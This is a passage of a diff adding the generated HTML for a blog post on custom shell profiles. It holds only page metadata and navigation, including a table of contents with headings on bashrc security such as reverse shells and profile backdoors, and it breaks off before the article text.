@@ -1,0 +1,2712 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://straysheep-dev.github.io/blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/">
+      
+      
+        <link rel="prev" href="../material-file-document-arrow-right-openscap-practical-usage/">
+      
+      
+        <link rel="next" href="../../../07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>Custom Shell Profiles - straysheep.dev</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Custom Shell Profiles - straysheep.dev" />
+<meta property="og:image" content="https://straysheep-dev.github.io/assets/images/social/blog/2024/05/29/octicons-terminal-16-custom-shell-profiles.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://straysheep-dev.github.io/blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="Custom Shell Profiles - straysheep.dev" />
+<meta property="twitter:image" content="https://straysheep-dev.github.io/assets/images/social/blog/2024/05/29/octicons-terminal-16-custom-shell-profiles.png" />
+</head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-orange" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#custom-shell-profiles" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="straysheep.dev" class="md-header__button md-logo" aria-label="straysheep.dev" data-md-component="logo">
+      
+  <img src="../../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            straysheep.dev
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Custom Shell Profiles
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep-orange" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/straysheep-dev/straysheep-dev.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    straysheep-dev.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Main
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../license/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  License
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="straysheep.dev" class="md-nav__button md-logo" aria-label="straysheep.dev" data-md-component="logo">
+      
+  <img src="../../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    straysheep.dev
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/straysheep-dev/straysheep-dev.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    straysheep-dev.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Main
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../license/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    License
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Blog
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2019/07/15/-resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⭐ Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15/octicons-alert-16-aide-advanced-intrusion-detection-environment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AIDE (Advanced Intrusion Detection Environment)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2023/08/20/simple-ansible-ansible/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ansible
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/07/25/simple-ansible-ansible-molecule/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ansible Molecule
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atomic Red Team x Unix Artifacts Collector
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../07/19/material-dns-bind9-dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BIND9 DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02/simple-bitwarden-bitwarden/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    bitwarden
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15/material-file-tree-triage-auditd-logs-with-check-auditd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Triage auditd logs with check-auditd
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/01/20/fontawesome-solid-gears-cicd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clipboard Snooping (X11 and Wayland)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compile Static Binaries
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Custom Shell Profiles
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Custom Shell Profiles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prompt-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prompt String
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prompt String">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#network-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ansi-colors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ANSI Colors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bash
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zsh-kali" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        zsh (Kali)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#controlling-venv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Controlling (venv)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#making-the-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Making the Changes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#testing-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Testing Changes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aliases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Aliases
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#export-and-import-shell-profiles-gnome" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Export and Import Shell Profiles (GNOME)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bashrc-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        bashrc Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="bashrc Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#profile-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Profile Backdoor
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detecting-modification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detecting Modification
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07/simple-flatpak-flatpak/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    flatpak
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../12/08/simple-qemu-kvm-kernel-based-virtual-machine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    KVM (Kernel-based Virtual Machine)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../12/28/material-code-tags-check-linting-code/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linting Code
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2022/08/29/material-magnify-scan-nessus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nessus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/04/18/material-console-network-network-commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    nzyme x [ Raspberry Pi + Proxmox + Tailscale]
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../material-file-document-arrow-right-openscap-practical-usage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenSCAP Practical Usage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07/simple-openwrt-openwrt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenWrt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02/simple-pfsense-pfsense-administration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pfSense administration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../07/19/material-powershell-get-started-with-powerstig/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Get Started with PowerSTIG
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../08/13/simple-proxmox-proxmox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Proxmox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/02/22/material-sync-circle-rsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    rsync
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07/simple-snapcraft-snap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    snap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../08/13/material-server-security-wazuh-all-your-things-with-tailscale/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wazuh all your things with Tailscale
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WiFiChallenge Exam &amp; Course Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08/material-microsoft-windows-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_30" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_30" id="__nav_3_30_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_30_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_30">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2024
+  
+
+    
